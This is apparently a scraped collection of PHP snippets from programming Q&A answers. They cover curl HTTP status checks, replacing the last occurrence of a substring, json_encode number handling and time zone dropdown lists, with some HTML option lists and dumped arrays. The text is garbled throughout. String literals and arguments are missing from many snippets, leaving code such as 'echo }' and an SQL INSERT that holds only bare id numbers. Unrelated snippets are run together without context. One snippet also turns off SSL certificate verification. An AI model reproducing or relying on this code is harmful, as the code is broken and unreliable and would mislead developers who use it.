$url = $ch = curl_init($url); curl_setopt($ch, CURLOPT_HEADER, true); curl_setopt($ch, CURLOPT_NOBODY, true); curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); curl_setopt($ch, CURLOPT_TIMEOUT,10); $output = curl_exec($ch); $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); echo
$http = curl_init($url); $result = curl_exec($http); $http_status = curl_getinfo($http, CURLINFO_HTTP_CODE); curl_close($http); echo $http_status;
<?php $url = print_r(get_headers($url)); print_r(get_headers($url, 1)); ?>
$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)"); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,false); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false); curl_setopt($ch, CURLOPT_MAXREDIRS, 10); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); curl_setopt($ch, CURLOPT_TIMEOUT, 20); $rt = curl_exec($ch); $info = curl_getinfo($ch); echo $info["http_code"];
<?php $ch = curl_init( curl_exec($ch); if(!curl_errno($ch)) { $info = curl_getinfo($ch); echo } curl_close($ch);
$url = while(true) { $strHeader = get_headers($url)[0]; $statusCode = substr($strHeader, 9, 3 ); if($statusCode != 200 ) { echo } else { echo } sleep(30); }
function str_lreplace($search, $replace, $subject) { $pos = strrpos($subject, $search); if($pos !== false) { $subject = substr_replace($subject, $replace, $pos, strlen($search)); } return $subject; }
$subject = $search = $replace = echo strrev(implode(strrev($replace), explode(strrev($search), strrev($subject), 2)));
$string = $find = $replace = $result = preg_replace(strrev("/$find/"),strrev($replace),strrev($string),1); echo strrev($result);
The quick brown fox, fox, fox jumps over the lazy dog!!!
function str_lreplace($search, $replace, $subject) { return preg_replace( }
function str_lreplace($search, $replace, $subject) { return preg_replace( }
$string = "picture_0007_value"; $findChar =strrpos($string,"_"); if($findChar !== FALSE) { $string[$findChar]="."; } echo $string;
$string = "picture_0007_value"; $findChar =strrpos($string,"_"); $string[$findChar]="."; echo $string;
function str_lreplace($search, $replace, $subject){ return is_numeric($pos=strrpos($subject,$search))? substr_replace($subject,$replace,$pos,strlen($search)):$subject; }
function preg_rreplace($search, $replace, $subject) { preg_match_all($search, $subject, $matches, PREG_SET_ORDER); $lastMatch = end($matches); if ($lastMatch && false !== $pos = strrpos($subject, $lastMatchedStr = $lastMatch[0])) { $subject = substr_replace($subject, $replace, $pos, strlen($lastMatchedStr)); } return $subject; }
function str_rreplace($search, $replace, $subject) { return (false !== $pos = strrpos($subject, $search)) ? substr_replace($subject, $replace, $pos, strlen($search)) : $subject; } function preg_rreplace($search, $replace, $subject) { preg_match_all($search, $subject, $matches, PREG_SET_ORDER); return ($lastMatch = end($matches)) ? str_rreplace($lastMatch[0], $replace, $subject) : $subject; }
$text = "The quick brown fox, fox, fox, fox, jumps over etc."; $fixed = preg_replace("((.*)fox)", "$1DUCK", $text); print($fixed);
$NewString = substr_replace($String,$Replacement,strrpos($String,$Replace),strlen($Replace));
$a = array( ); $json = json_encode($a); echo $json;
$arr = array( echo json_encode( $arr, JSON_NUMERIC_CHECK );
<?php class testclass { public $foo = 1; public $bar = 2; public $baz = "Hello, world"; } $testarr = array( $json_obj_txt = json_encode(new testclass()); $json_arr_txt = json_encode($testarr); echo "<p>Object encoding:</p><pre>" . $json_obj_txt . "</pre>"; echo "<p>Array encoding:</p><pre>" . $json_arr_txt . "</pre>"; settype($testarr["foo"], "string"); $json_arr_cast_txt = json_encode($testarr); echo "<p>Array encoding w/ cast:</p><pre>" . $json_arr_cast_txt . "</pre>"; ?>
$rows = array(); while($r = mysql_fetch_assoc($result)) { $r["id"] = intval($r["id"]); $rows[] = $r; } print json_encode($rows);
$coordinates => array( (float) $ap->latitude, (float) $ap->longitude );
<option value="-12">[UTC - 12] Baker Island Time</option> <option value="-11">[UTC - 11] Niue Time, Samoa Standard Time</option> <option value="-10">[UTC - 10] Hawaii-Aleutian Standard Time, Cook Island Time</option> <option value="-9.5">[UTC - 9:30] Marquesas Islands Time</option> <option value="-9">[UTC - 9] Alaska Standard Time, Gambier Island Time</option> <option value="-8">[UTC - 8] Pacific Standard Time</option> <option value="-7">[UTC - 7] Mountain Standard Time</option> <option value="-6">[UTC - 6] Central Standard Time</option> <option value="-5">[UTC - 5] Eastern Standard Time</option> <option value="-4.5">[UTC - 4:30] Venezuelan Standard Time</option> <option value="-4">[UTC - 4] Atlantic Standard Time</option> <option value="-3.5">[UTC - 3:30] Newfoundland Standard Time</option> <option value="-3">[UTC - 3] Amazon Standard Time, Central Greenland Time</option> <option value="-2">[UTC - 2] Fernando de Noronha Time, South Georgia &amp; the South Sandwich Islands Time</option> <option value="-1">[UTC - 1] Azores Standard Time, Cape Verde Time, Eastern Greenland Time</option> <option value="0" selected="selected">[UTC] Western European Time, Greenwich Mean Time</option> <option value="1">[UTC + 1] Central European Time, West African Time</option> <option value="2">[UTC + 2] Eastern European Time, Central African Time</option> <option value="3">[UTC + 3] Moscow Standard Time, Eastern African Time</option> <option value="3.5">[UTC + 3:30] Iran Standard Time</option> <option value="4">[UTC + 4] Gulf Standard Time, Samara Standard Time</option> <option value="4.5">[UTC + 4:30] Afghanistan Time</option> <option value="5">[UTC + 5] Pakistan Standard Time, Yekaterinburg Standard Time</option> <option value="5.5">[UTC + 5:30] Indian Standard Time, Sri Lanka Time</option> <option value="5.75">[UTC + 5:45] Nepal Time</option> <option value="6">[UTC + 6] Bangladesh Time, Bhutan Time, Novosibirsk Standard Time</option> <option value="6.5">[UTC + 6:30] Cocos Islands Time, Myanmar Time</option> <option value="7">[UTC + 7] Indochina Time, Krasnoyarsk Standard Time</option> <option value="8">[UTC + 8] Chinese Standard Time, Australian Western Standard Time, Irkutsk Standard Time</option> <option value="8.75">[UTC + 8:45] Southeastern Western Australia Standard Time</option> <option value="9">[UTC + 9] Japan Standard Time, Korea Standard Time, Chita Standard Time</option> <option value="9.5">[UTC + 9:30] Australian Central Standard Time</option> <option value="10">[UTC + 10] Australian Eastern Standard Time, Vladivostok Standard Time</option> <option value="10.5">[UTC + 10:30] Lord Howe Standard Time</option> <option value="11">[UTC + 11] Solomon Island Time, Magadan Standard Time</option> <option value="11.5">[UTC + 11:30] Norfolk Island Time</option> <option value="12">[UTC + 12] New Zealand Time, Fiji Time, Kamchatka Standard Time</option> <option value="12.75">[UTC + 12:45] Chatham Islands Time</option> <option value="13">[UTC + 13] Tonga Time, Phoenix Islands Time</option> <option value="14">[UTC + 14] Line Island Time</option>
<option value="Pacific/Midway">(GMT-11:00) Midway Island, Samoa</option> <option value="America/Adak">(GMT-10:00) Hawaii-Aleutian</option> <option value="Etc/GMT+10">(GMT-10:00) Hawaii</option> <option value="Pacific/Marquesas">(GMT-09:30) Marquesas Islands</option> <option value="Pacific/Gambier">(GMT-09:00) Gambier Islands</option> <option value="America/Anchorage">(GMT-09:00) Alaska</option> <option value="America/Ensenada">(GMT-08:00) Tijuana, Baja California</option> <option value="Etc/GMT+8">(GMT-08:00) Pitcairn Islands</option> <option value="America/Los_Angeles">(GMT-08:00) Pacific Time (US & Canada)</option> <option value="America/Denver">(GMT-07:00) Mountain Time (US & Canada)</option> <option value="America/Chihuahua">(GMT-07:00) Chihuahua, La Paz, Mazatlan</option> <option value="America/Dawson_Creek">(GMT-07:00) Arizona</option> <option value="America/Belize">(GMT-06:00) Saskatchewan, Central America</option> <option value="America/Cancun">(GMT-06:00) Guadalajara, Mexico City, Monterrey</option> <option value="Chile/EasterIsland">(GMT-06:00) Easter Island</option> <option value="America/Chicago">(GMT-06:00) Central Time (US & Canada)</option> <option value="America/New_York">(GMT-05:00) Eastern Time (US & Canada)</option> <option value="America/Havana">(GMT-05:00) Cuba</option> <option value="America/Bogota">(GMT-05:00) Bogota, Lima, Quito, Rio Branco</option> <option value="America/Caracas">(GMT-04:30) Caracas</option> <option value="America/Santiago">(GMT-04:00) Santiago</option> <option value="America/La_Paz">(GMT-04:00) La Paz</option> <option value="Atlantic/Stanley">(GMT-04:00) Faukland Islands</option> <option value="America/Campo_Grande">(GMT-04:00) Brazil</option> <option value="America/Goose_Bay">(GMT-04:00) Atlantic Time (Goose Bay)</option> <option value="America/Glace_Bay">(GMT-04:00) Atlantic Time (Canada)</option> <option value="America/St_Johns">(GMT-03:30) Newfoundland</option> <option value="America/Araguaina">(GMT-03:00) UTC-3</option> <option value="America/Montevideo">(GMT-03:00) Montevideo</option> <option value="America/Miquelon">(GMT-03:00) Miquelon, St. Pierre</option> <option value="America/Godthab">(GMT-03:00) Greenland</option> <option value="America/Argentina/Buenos_Aires">(GMT-03:00) Buenos Aires</option> <option value="America/Sao_Paulo">(GMT-03:00) Brasilia</option> <option value="America/Noronha">(GMT-02:00) Mid-Atlantic</option> <option value="Atlantic/Cape_Verde">(GMT-01:00) Cape Verde Is.</option> <option value="Atlantic/Azores">(GMT-01:00) Azores</option> <option value="Europe/Belfast">(GMT) Greenwich Mean Time : Belfast</option> <option value="Europe/Dublin">(GMT) Greenwich Mean Time : Dublin</option> <option value="Europe/Lisbon">(GMT) Greenwich Mean Time : Lisbon</option> <option value="Europe/London">(GMT) Greenwich Mean Time : London</option> <option value="Africa/Abidjan">(GMT) Monrovia, Reykjavik</option> <option value="Europe/Amsterdam">(GMT+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna</option> <option value="Europe/Belgrade">(GMT+01:00) Belgrade, Bratislava, Budapest, Ljubljana, Prague</option> <option value="Europe/Brussels">(GMT+01:00) Brussels, Copenhagen, Madrid, Paris</option> <option value="Africa/Algiers">(GMT+01:00) West Central Africa</option> <option value="Africa/Windhoek">(GMT+01:00) Windhoek</option> <option value="Asia/Beirut">(GMT+02:00) Beirut</option> <option value="Africa/Cairo">(GMT+02:00) Cairo</option> <option value="Asia/Gaza">(GMT+02:00) Gaza</option> <option value="Africa/Blantyre">(GMT+02:00) Harare, Pretoria</option> <option value="Asia/Jerusalem">(GMT+02:00) Jerusalem</option> <option value="Europe/Minsk">(GMT+02:00) Minsk</option> <option value="Asia/Damascus">(GMT+02:00) Syria</option> <option value="Europe/Moscow">(GMT+03:00) Moscow, St. Petersburg, Volgograd</option> <option value="Africa/Addis_Ababa">(GMT+03:00) Nairobi</option> <option value="Asia/Tehran">(GMT+03:30) Tehran</option> <option value="Asia/Dubai">(GMT+04:00) Abu Dhabi, Muscat</option> <option value="Asia/Yerevan">(GMT+04:00) Yerevan</option> <option value="Asia/Kabul">(GMT+04:30) Kabul</option> <option value="Asia/Yekaterinburg">(GMT+05:00) Ekaterinburg</option> <option value="Asia/Tashkent">(GMT+05:00) Tashkent</option> <option value="Asia/Kolkata">(GMT+05:30) Chennai, Kolkata, Mumbai, New Delhi</option> <option value="Asia/Katmandu">(GMT+05:45) Kathmandu</option> <option value="Asia/Dhaka">(GMT+06:00) Astana, Dhaka</option> <option value="Asia/Novosibirsk">(GMT+06:00) Novosibirsk</option> <option value="Asia/Rangoon">(GMT+06:30) Yangon (Rangoon)</option> <option value="Asia/Bangkok">(GMT+07:00) Bangkok, Hanoi, Jakarta</option> <option value="Asia/Krasnoyarsk">(GMT+07:00) Krasnoyarsk</option> <option value="Asia/Hong_Kong">(GMT+08:00) Beijing, Chongqing, Hong Kong, Urumqi</option> <option value="Asia/Irkutsk">(GMT+08:00) Irkutsk, Ulaan Bataar</option> <option value="Australia/Perth">(GMT+08:00) Perth</option> <option value="Australia/Eucla">(GMT+08:45) Eucla</option> <option value="Asia/Tokyo">(GMT+09:00) Osaka, Sapporo, Tokyo</option> <option value="Asia/Seoul">(GMT+09:00) Seoul</option> <option value="Asia/Yakutsk">(GMT+09:00) Yakutsk</option> <option value="Australia/Adelaide">(GMT+09:30) Adelaide</option> <option value="Australia/Darwin">(GMT+09:30) Darwin</option> <option value="Australia/Brisbane">(GMT+10:00) Brisbane</option> <option value="Australia/Hobart">(GMT+10:00) Hobart</option> <option value="Asia/Vladivostok">(GMT+10:00) Vladivostok</option> <option value="Australia/Lord_Howe">(GMT+10:30) Lord Howe Island</option> <option value="Etc/GMT-11">(GMT+11:00) Solomon Is., New Caledonia</option> <option value="Asia/Magadan">(GMT+11:00) Magadan</option> <option value="Pacific/Norfolk">(GMT+11:30) Norfolk Island</option> <option value="Asia/Anadyr">(GMT+12:00) Anadyr, Kamchatka</option> <option value="Pacific/Auckland">(GMT+12:00) Auckland, Wellington</option> <option value="Etc/GMT-12">(GMT+12:00) Fiji, Kamchatka, Marshall Is.</option> <option value="Pacific/Chatham">(GMT+12:45) Chatham Islands</option> <option value="Pacific/Tongatapu">(GMT+13:00) Nuku <option value="Pacific/Kiritimati">(GMT+14:00) Kiritimati</option>
$timezones = DateTimeZone::listAbbreviations(); $cities = array(); foreach( $timezones as $key => $zones ) { foreach( $zones as $id => $zone ) { /** * Only get timezones explicitely not part of "Others". * @see http: */ if ( preg_match( && $zone[ $cities[$zone[ } } } foreach( $cities as $key => $value ) $cities[$key] = join( $cities = array_unique( $cities ); ksort( $cities );
$tzlist = DateTimeZone::listIdentifiers(DateTimeZone::ALL);
function generate_timezone_list() { static $regions = array( DateTimeZone::AFRICA, DateTimeZone::AMERICA, DateTimeZone::ANTARCTICA, DateTimeZone::ASIA, DateTimeZone::ATLANTIC, DateTimeZone::AUSTRALIA, DateTimeZone::EUROPE, DateTimeZone::INDIAN, DateTimeZone::PACIFIC, ); $timezones = array(); foreach( $regions as $region ) { $timezones = array_merge( $timezones, DateTimeZone::listIdentifiers( $region ) ); } $timezone_offsets = array(); foreach( $timezones as $timezone ) { $tz = new DateTimeZone($timezone); $timezone_offsets[$timezone] = $tz->getOffset(new DateTime); } asort($timezone_offsets); $timezone_list = array(); foreach( $timezone_offsets as $timezone => $offset ) { $offset_prefix = $offset < 0 ? $offset_formatted = gmdate( $pretty_offset = "UTC${offset_prefix}${offset_formatted}"; $timezone_list[$timezone] = "(${pretty_offset}) $timezone"; } return $timezone_list; }
[Pacific/Midway] => (UTC-11:00) Pacific/Midway [Pacific/Pago_Pago] => (UTC-11:00) Pacific/Pago_Pago [Pacific/Niue] => (UTC-11:00) Pacific/Niue [Pacific/Honolulu] => (UTC-10:00) Pacific/Honolulu [Pacific/Fakaofo] => (UTC-10:00) Pacific/Fakaofo …
function timezone_list() { static $timezones = null; if ($timezones === null) { $timezones = []; $offsets = []; $now = new DateTime( foreach (DateTimeZone::listIdentifiers() as $timezone) { $now->setTimezone(new DateTimeZone($timezone)); $offsets[] = $offset = $now->getOffset(); $timezones[$timezone] = } array_multisort($offsets, $timezones); } return $timezones; } function format_GMT_offset($offset) { $hours = intval($offset / 3600); $minutes = abs(intval($offset % 3600 / 60)); return } function format_timezone_name($name) { $name = str_replace( $name = str_replace( $name = str_replace( return $name; }
Array ( [Pacific/Midway] => (GMT-11:00) Pacific, Midway [Pacific/Niue] => (GMT-11:00) Pacific, Niue [Pacific/Pago_Pago] => (GMT-11:00) Pacific, Pago Pago [America/Adak] => (GMT-10:00) America, Adak [Pacific/Honolulu] => (GMT-10:00) Pacific, Honolulu [Pacific/Johnston] => (GMT-10:00) Pacific, Johnston [Pacific/Rarotonga] => (GMT-10:00) Pacific, Rarotonga [Pacific/Tahiti] => (GMT-10:00) Pacific, Tahiti [Pacific/Marquesas] => (GMT-09:30) Pacific, Marquesas [America/Anchorage] => (GMT-09:00) America, Anchorage ... )
$list = DateTimeZone::listAbbreviations(); $idents = DateTimeZone::listIdentifiers(); $data = $offset = $added = array(); foreach ($list as $abbr => $info) { foreach ($info as $zone) { if ( ! empty($zone[ AND ! in_array($zone[ AND in_array($zone[ $z = new DateTimeZone($zone[ $c = new DateTime(null, $z); $zone[ $offset[] = $zone[ $data[] = $zone; $added[] = $zone[ } } } array_multisort($offset, SORT_ASC, $data); $options = array(); foreach ($data as $key => $row) { $options[$row[ . formatOffset($row[ . } function formatOffset($offset) { $hours = $offset / 3600; $remainder = $offset % 3600; $sign = $hours > 0 ? $hour = (int) abs($hours); $minutes = (int) abs($remainder / 60); if ($hour == 0 AND $minutes == 0) { $sign = } return . }
<option value="America/Boise" label="02:10 am - GMT-06:00 America/Boise">02:10 am - GMT-06:00 America/Boise</option> <option value="America/Denver" label="02:10 am - GMT-06:00 America/Denver">02:10 am - GMT-06:00 America/Denver</option> <option value="America/Edmonton" label="02:10 am - GMT-06:00 America/Edmonton">02:10 am - GMT-06:00 America/Edmonton</option> <option value="America/Inuvik" label="02:10 am - GMT-06:00 America/Inuvik">02:10 am - GMT-06:00 America/Inuvik</option> <option value="America/Shiprock" label="02:10 am - GMT-06:00 America/Shiprock">02:10 am - GMT-06:00 America/Shiprock</option> <option value="America/Belize" label="02:10 am - GMT-05:00 America/Belize">02:10 am - GMT-05:00 America/Belize</option>
CREATE TABLE IF NOT EXISTS `timezones` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(44) DEFAULT NULL, `timezone` varchar(30) DEFAULT NULL, PRIMARY KEY (`id`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=141 ; -- -- Dumping data for table `timezones` -- INSERT INTO `timezones` (`id`, `name`, `timezone`) VALUES (1, (2, (3, (4, (5, (6, (7, (8, (9, (10, (11, (12, (13, (14, (15, (16, (17, (18, (19, (20, (21, (22, (23, (24, (25, (26, (27, (28, (29, (30, (31, (32, (33, (34, (35, (36, (37, (38, (39, (40, (41, (42, (43, (44, (45, (46, (47, (48, (49, (50, (51, (52, (53, (54, (55, (56, (57, (58, (59, (60, (61, (62, (63, (64, (65, (66, (67, (68, (69, (70, (71, (72, (73, (74, (75, (76, (77, (78, (79, (80, (81, (82, (83, (84, (85, (86, (87, (88, (89, (90, (91, (92, (93, (94, (95, (96, (97, (98, (99, (100, (101, (102, (103, (104, (105, (106, (107, (108, (109, (110, (111, (112, (113, (114, (115, (116, (117, (118, (119, (120, (121, (122, (123, (124, (125, (126, (127, (128, (129, (130, (131, (132, (133, (134, (135, (136, (137, (138, (139, (140, ; ; ;
function timezones() { $timezones = []; foreach (timezone_identifiers_list() as $timezone) { $datetime = new \DateTime( $timezones[] = [ ]; } usort($timezones, function($a, $b) { return $a[ }); return $timezones; } foreach (timezones() as $timezone) { echo }
(UTC -11:00) Pacific, Midway (UTC -11:00) Pacific, Niue (UTC -11:00) Pacific, Pago Pago (UTC -10:00) Pacific, Honolulu (UTC -10:00) Pacific, Johnston (UTC -10:00) Pacific, Rarotonga (UTC -10:00) Pacific, Tahiti (UTC -09:30) Pacific, Marquesas (UTC -09:00) America, Adak (UTC -09:00) Pacific, Gambier (UTC -08:00) America, Anchorage (UTC -08:00) America, Juneau ...
function generate_timezone_list() { static $allRegions = array( DateTimeZone::AFRICA, DateTimeZone::AMERICA, DateTimeZone::ANTARCTICA, DateTimeZone::ASIA, DateTimeZone::ATLANTIC, DateTimeZone::AUSTRALIA, DateTimeZone::EUROPE, DateTimeZone::INDIAN, DateTimeZone::PACIFIC ); $list = array ( $region = array(); foreach ($allRegions as $area){ array_push ($region,DateTimeZone::listIdentifiers( $area )); } $count = count ($region); $i = 0; $holder = while ($i < $count){ $chunck = $region[$i]; $holder .= $timezone_offsets = array(); foreach( $chunck as $timezone ){ $tz = new DateTimeZone($timezone); $timezone_offsets[$timezone] = $tz->getOffset(new DateTime); } asort ($timezone_offsets); $timezone_list = array(); foreach ($timezone_offsets as $timezone => $offset){ $offset_prefix = $offset < 0 ? $offset_formatted = gmdate( $pretty_offset = "UTC ${offset_prefix}${offset_formatted}"; $timezone_list[$timezone] = "(${pretty_offset}) $timezone"; } foreach ($timezone_list as $key => $val){ $holder .= } $holder .= ++$i; } return $holder; } echo "<select>".generate_timezone_list()."</select>";
----- AFRICA ----- (UTC +00:00) Africa/ city name (UTC +01:00) Africa/ city name (UTC +02:00) Africa/ city name (UTC +02:00) Africa/ city name ----- AMERICA ----- (UTC -09:00) America/ city name (UTC -07:00) America/ city name (UTC +02:00) America/ city name (UTC +05:00) America/ city name
function time_zonelist(){ $return = array(); $timezone_identifiers_list = timezone_identifiers_list(); foreach($timezone_identifiers_list as $timezone_identifier){ $date_time_zone = new DateTimeZone($timezone_identifier); $date_time = new DateTime( $hours = floor($date_time_zone->getOffset($date_time) / 3600); $mins = floor(($date_time_zone->getOffset($date_time) - ($hours*3600)) / 60); $hours = $mins = ($mins > 0 ? $mins : $text = str_replace("_"," ",$timezone_identifier); $return[$timezone_identifier] = $text. } return $return; }
$timezones = [ "AF" => [ "name" => "Afghanistan" ], "AL" => [ "name" => "Albania" ], "DZ" => [ "name" => "Algeria" ], "AS" => [ "name" => "American Samoa" ], "AD" => [ "name" => "Andorra" ], "AQ" => [ "name" => "Antarctica" ], "AG" => [ "name" => "Antigua & Barbuda" ], "AR" => [ "name" => "Argentina" ], "AM" => [ "name" => "Armenia" ], "AU" => [ "name" => "Australia" ], "AT" => [ "name" => "Austria" ], "AZ" => [ "name" => "Azerbaijan" ], "BS" => [ "name" => "Bahamas" ], "BD" => [ "name" => "Bangladesh" ], "BB" => [ "name" => "Barbados" ], "BY" => [ "name" => "Belarus" ], "BE" => [ "name" => "Belgium" ], "BZ" => [ "name" => "Belize" ], "BM" => [ "name" => "Bermuda" ], "BT" => [ "name" => "Bhutan" ], "BO" => [ "name" => "Bolivia" ], "BA" => [ "name" => "Bosnia & Herzegovina" ], "BR" => [ "name" => "Brazil" ], "IO" => [ "name" => "British Indian Ocean Territory" ], "BN" => [ "name" => "Brunei" ], "BG" => [ "name" => "Bulgaria" ], "CA" => [ "name" => "Canada" ], "CV" => [ "name" => "Cape Verde" ], "KY" => [ "name" => "Cayman Islands" ], "TD" => [ "name" => "Chad" ], "CL" => [ "name" => "Chile" ], "CN" => [ "name" => "China" ], "CX" => [ "name" => "Christmas Island" ], "CC" => [ "name" => "Cocos (Keeling) Islands" ], "CO" => [ "name" => "Colombia" ], "CK" => [ "name" => "Cook Islands" ], "CR" => [ "name" => "Costa Rica" ], "CI" => [ "name" => "Côte d’Ivoire" ], "HR" => [ "name" => "Croatia" ], "CU" => [ "name" => "Cuba" ], "CW" => [ "name" => "Curaçao" ], "CY" => [ "name" => "Cyprus" ], "CZ" => [ "name" => "Czech Republic" ], "DK" => [ "name" => "Denmark" ], "DO" => [ "name" => "Dominican Republic" ], "EC" => [ "name" => "Ecuador" ], "EG" => [ "name" => "Egypt" ], "SV" => [ "name" => "El Salvador" ], "EE" => [ "name" => "Estonia" ], "FK" => [ "name" => "Falkland Islands (Islas Malvinas)" ], "FO" => [ "name" => "Faroe Islands" ], "FJ" => [ "name" => "Fiji" ], "FI" => [ "name" => "Finland" ], "FR" => [ "name" => "France" ], "GF" => [ "name" => "French Guiana" ], "PF" => [ "name" => "French Polynesia" ], "TF" => [ "name" => "French Southern Territories" ], "GE" => [ "name" => "Georgia" ], "DE" => [ "name" => "Germany" ], "GH" => [ "name" => "Ghana" ], "GI" => [ "name" => "Gibraltar" ], "GR" => [ "name" => "Greece" ], "GL" => [ "name" => "Greenland" ], "GU" => [ "name" => "Guam" ], "GT" => [ "name" => "Guatemala" ], "GW" => [ "name" => "Guinea-Bissau" ], "GY" => [ "name" => "Guyana" ], "HT" => [ "name" => "Haiti" ], "HN" => [ "name" => "Honduras" ], "HK" => [ "name" => "Hong Kong" ], "HU" => [ "name" => "Hungary" ], "IS" => [ "name" => "Iceland" ], "IN" => [ "name" => "India" ], "ID" => [ "name" => "Indonesia" ], "IR" => [ "name" => "Iran" ], "IQ" => [ "name" => "Iraq" ], "IE" => [ "name" => "Ireland" ], "IL" => [ "name" => "Israel" ], "IT" => [ "name" => "Italy" ], "JM" => [ "name" => "Jamaica" ], "JP" => [ "name" => "Japan" ], "JO" => [ "name" => "Jordan" ], "KZ" => [ "name" => "Kazakhstan" ], "KE" => [ "name" => "Kenya" ], "KI" => [ "name" => "Kiribati" ], "KG" => [ "name" => "Kyrgyzstan" ], "LV" => [ "name" => "Latvia" ], "LB" => [ "name" => "Lebanon" ], "LR" => [ "name" => "Liberia" ], "LY" => [ "name" => "Libya" ], "LT" => [ "name" => "Lithuania" ], "LU" => [ "name" => "Luxembourg" ], "MO" => [ "name" => "Macau" ], "MK" => [ "name" => "Macedonia (FYROM)" ], "MY" => [ "name" => "Malaysia" ], "MV" => [ "name" => "Maldives" ], "MT" => [ "name" => "Malta" ], "MH" => [ "name" => "Marshall Islands" ], "MQ" => [ "name" => "Martinique" ], "MU" => [ "name" => "Mauritius" ], "MX" => [ "name" => "Mexico" ], "FM" => [ "name" => "Micronesia" ], "MD" => [ "name" => "Moldova" ], "MC" => [ "name" => "Monaco" ], "MN" => [ "name" => "Mongolia" ], "MA" => [ "name" => "Morocco" ], "MZ" => [ "name" => "Mozambique" ], "MM" => [ "name" => "Myanmar (Burma)" ], "NA" => [ "name" => "Namibia" ], "NR" => [ "name" => "Nauru" ], "NP" => [ "name" => "Nepal" ], "NL" => [ "name" => "Netherlands" ], "NC" => [ "name" => "New Caledonia" ], "NZ" => [ "name" => "New Zealand" ], "NI" => [ "name" => "Nicaragua" ], "NG" => [ "name" => "Nigeria" ], "NU" => [ "name" => "Niue" ], "NF" => [ "name" => "Norfolk Island" ], "KP" => [ "name" => "North Korea" ], "MP" => [ "name" => "Northern Mariana Islands" ], "NO" => [ "name" => "Norway" ], "PK" => [ "name" => "Pakistan" ], "PW" => [ "name" => "Palau" ], "PS" => [ "name" => "Palestine" ], "PA" => [ "name" => "Panama" ], "PG" => [ "name" => "Papua New Guinea" ], "PY" => [ "name" => "Paraguay" ], "PE" => [ "name" => "Peru" ], "PH" => [ "name" => "Philippines" ], "PN" => [ "name" => "Pitcairn Islands" ], "PL" => [ "name" => "Poland" ], "PT" => [ "name" => "Portugal" ], "PR" => [ "name" => "Puerto Rico" ], "QA" => [ "name" => "Qatar" ], "RE" => [ "name" => "Réunion" ], "RO" => [ "name" => "Romania" ], "RU" => [ "name" => "Russia" ], "WS" => [ "name" => "Samoa" ], "SM" => [ "name" => "San Marino" ], "SA" => [ "name" => "Saudi Arabia" ], "RS" => [ "name" => "Serbia" ], "SC" => [ "name" => "Seychelles" ], "SG" => [ "name" => "Singapore" ], "SK" => [ "name" => "Slovakia" ], "SI" => [ "name" => "Slovenia" ], "SB" => [ "name" => "Solomon Islands" ], "ZA" => [ "name" => "South Africa" ], "GS" => [ "name" => "South Georgia & South Sandwich Islands" ], "KR" => [ "name" => "South Korea" ], "ES" => [ "name" => "Spain" ], "LK" => [ "name" => "Sri Lanka" ], "PM" => [ "name" => "St. Pierre & Miquelon" ], "SD" => [ "name" => "Sudan" ], "SR" => [ "name" => "Suriname" ], "SJ" => [ "name" => "Svalbard & Jan Mayen" ], "SE" => [ "name" => "Sweden" ], "CH" => [ "name" => "Switzerland" ], "SY" => [ "name" => "Syria" ], "TW" => [ "name" => "Taiwan" ], "TJ" => [ "name" => "Tajikistan" ], "TH" => [ "name" => "Thailand" ], "TL" => [ "name" => "Timor-Leste" ], "TK" => [ "name" => "Tokelau" ], "TO" => [ "name" => "Tonga" ], "TT" => [ "name" => "Trinidad & Tobago" ], "TN" => [ "name" => "Tunisia" ], "TR" => [ "name" => "Turkey" ], "TM" => [ "name" => "Turkmenistan" ], "TC" => [ "name" => "Turks & Caicos Islands" ], "TV" => [ "name" => "Tuvalu" ], "UM" => [ "name" => "U.S. Outlying Islands" ], "UA" => [ "name" => "Ukraine" ], "AE" => [ "name" => "United Arab Emirates" ], "GB" => [ "name" => "United Kingdom" ], "US" => [ "name" => "United States" ], "UY" => [ "name" => "Uruguay" ], "UZ" => [ "name" => "Uzbekistan" ], "VU" => [ "name" => "Vanuatu" ], "VA" => [ "name" => "Vatican City" ], "VE" => [ "name" => "Venezuela" ], "VN" => [ "name" => "Vietnam" ], "WF" => [ "name" => "Wallis & Futuna" ], "EH" => [ "name" => "Western Sahara" ], ]; function prettyOffset($offset) { $offset_prefix = $offset < 0 ? $offset_formatted = gmdate( $pretty_offset = "UTC${offset_prefix}${offset_formatted}"; return $pretty_offset; } foreach ($timezones as $k => $v) { $tz = DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, $k); foreach ($tz as $value) { $t = new DateTimeZone($value); $offset = (new DateTime("now", $t))->getOffset(); $timezones[$k][ } }
["US"]=> array(2) { ["name"]=> string(13) "United States" ["timezones"]=> array(29) { ["America/Adak"]=> string(9) "UTC-10:00" ["America/Anchorage"]=> string(9) "UTC-09:00" ["America/Boise"]=> string(9) "UTC-07:00" ["America/Chicago"]=> string(9) "UTC-06:00" ["America/Denver"]=> string(9) "UTC-07:00" ["America/Detroit"]=> string(9) "UTC-05:00" ["America/Indiana/Indianapolis"]=> string(9) "UTC-05:00" ["America/Indiana/Knox"]=> string(9) "UTC-06:00" ["America/Indiana/Marengo"]=> string(9) "UTC-05:00" ["America/Indiana/Petersburg"]=> string(9) "UTC-05:00" ["America/Indiana/Tell_City"]=> string(9) "UTC-06:00" ["America/Indiana/Vevay"]=> string(9) "UTC-05:00" ["America/Indiana/Vincennes"]=> string(9) "UTC-05:00" ["America/Indiana/Winamac"]=> string(9) "UTC-05:00" ["America/Juneau"]=> string(9) "UTC-09:00" ["America/Kentucky/Louisville"]=> string(9) "UTC-05:00" ["America/Kentucky/Monticello"]=> string(9) "UTC-05:00" ["America/Los_Angeles"]=> string(9) "UTC-08:00" ["America/Menominee"]=> string(9) "UTC-06:00" ["America/Metlakatla"]=> string(9) "UTC-08:00" ["America/New_York"]=> string(9) "UTC-05:00" ["America/Nome"]=> string(9) "UTC-09:00" ["America/North_Dakota/Beulah"]=> string(9) "UTC-06:00" ["America/North_Dakota/Center"]=> string(9) 